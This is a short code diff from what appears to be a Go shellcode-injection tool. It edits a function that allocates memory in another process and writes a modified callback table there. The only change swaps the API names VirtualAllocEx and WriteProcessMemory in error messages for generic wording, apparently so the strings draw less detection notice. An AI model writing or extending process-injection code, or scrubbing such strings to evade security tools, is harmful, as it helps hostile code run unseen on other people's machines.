@@ -398,11 +398,11 @@ func executeOpusVariant4(shellcode []byte, pid uint32) (string, error) {
 	// Step 7: Allocate + write modified table (RW is fine, no execution needed)
 	remoteTableAddr, err := injectAllocMemory(hProcess, tableSize, PAGE_READWRITE)
 	if err != nil {
-		return sb.String(), fmt.Errorf("VirtualAllocEx for table failed: %v", err)
+		return sb.String(), fmt.Errorf("remote allocation for table failed: %v", err)
 	}
 	_, err = injectWriteMemory(hProcess, remoteTableAddr, modifiedTable)
 	if err != nil {
-		return sb.String(), fmt.Errorf("WriteProcessMemory for table failed: %v", err)
+		return sb.String(), fmt.Errorf("remote write for table failed: %v", err)
 	}
 	sb.WriteString(fmt.Sprintf("[+] Modified callback table at: 0x%X\n", remoteTableAddr))
 
